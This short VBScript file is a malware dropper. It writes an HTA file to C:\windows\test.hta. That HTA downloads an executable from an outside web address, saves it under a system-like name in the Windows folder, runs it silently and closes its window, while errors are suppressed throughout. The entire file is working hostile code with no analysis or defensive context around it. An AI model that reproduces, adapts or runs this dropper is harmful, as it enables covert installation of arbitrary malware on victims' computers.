on error resume next
set evanchik = CreateObject("ADODB.Recordset")
   With evanchik
       .Fields.Append "evanchik", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("evanchik").Value = "<script language=vbscript>: on error resume next : set o = CreateObject(""msxml2.XMLHTTP"") : o.open ""GET"",""http://5sec.org/acc4/sp/web.exe"",False : o.send : set s = createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\windows\winini.exe"",2 : Set ws = CreateObject(""WScript.Shell"") : ws.Run ""C:\windows\winini.exe"", 3, FALSE : </script> : <script> : window.close() : </script>"
       Call .Update
   End With
evanchik.Save "C:\windows\test.hta", adPersistXML
evanchik.Close